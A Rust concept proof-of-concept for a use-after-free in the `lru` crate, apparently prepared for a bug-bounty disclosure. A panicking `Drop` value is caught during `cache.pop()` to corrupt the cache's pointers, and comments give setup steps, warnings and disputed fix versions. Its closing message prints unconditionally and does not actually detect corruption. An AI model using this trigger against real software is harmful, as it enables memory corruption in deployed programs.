// PoC concept for RUSTSEC-2026-0253 (panic safety / use-after-free variant)
//
// NOTE: This is a CONCEPT PoC, not a compiled target of bnn-code.
// Run it in a SEPARATE throwaway crate with a VULNERABLE `lru` as a dependency:
//
//   cargo new poc_lru_demo && cd poc_lru_demo
//   cargo add lru@0.12.5        # vulnerable: any lru < 0.18.2 (0.12.x and 0.16.x both affected)
//   cp poc_lru.rs src/main.rs
//   cargo run
//
// Do NOT run this against the production bnn-code build, and do NOT post the
// running PoC publicly before the upstream fix is released.
//
// FIXED in lru 0.18.2 (jeromefroe/lru-rs#238). The bounty guide's "0.12.6" /
// "0.16.0" fix advice is WRONG: 0.12.6 does not exist, and 0.16.4 (thus 0.16.0)
// is still vulnerable.
use lru::LruCache;
use std::num::NonZeroUsize;

struct PanicOnDrop;

impl Drop for PanicOnDrop {
    fn drop(&mut self) {
        panic!("panic in drop - triggers UAF in lru < 0.18.2");
    }
}

fn main() {
    let mut cache = LruCache::new(NonZeroUsize::new(2).unwrap());
    cache.put(1, PanicOnDrop);
    // pop() that causes drop -> panic -> internal state corrupted
    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        cache.pop(&1);
    }));
    // If this prints with corrupted state, the cache is vulnerable (< 0.18.2).
    // After updating to lru >=0.18.2 the drop panic must not corrupt
    // the cache's internal pointers (node is detached before free).
    println!("If this prints with corrupted state, vulnerable");
}
